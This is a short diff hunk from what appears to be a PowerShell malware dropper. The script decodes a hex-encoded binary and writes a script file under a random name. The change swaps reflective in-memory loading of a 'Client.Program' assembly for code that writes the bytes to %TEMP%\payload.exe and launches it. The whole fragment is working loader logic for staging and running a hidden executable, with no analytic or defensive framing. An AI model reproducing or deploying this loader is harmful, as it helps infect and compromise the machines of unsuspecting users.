@@ -27,10 +27,9 @@ if ($hex.Length % 2 -ne 0) { $hex = $hex.Substring(0, $hex.Length - 1) }
 [byte[]]$bytes = for ($i = 0; $i -lt $hex.Length; $i += 2) {
     [Convert]::ToByte($hex.Substring($i, 2), 16)
 }
-$asm = [System.Reflection.Assembly]::Load($bytes)
-$type = $asm.GetType("Client.Program")
-$method = $type.GetMethod("Main", 'NonPublic,Static')
-$method.Invoke($null, @())
+$outExe = "$env:TEMP\payload.exe"
+[IO.File]::WriteAllBytes($outExe, $bytes)
+Start-Process $outExe
 '@ 
 
 [IO.File]::WriteAllText("$fullPath\$randomProgram.ps1", $ContentPS)
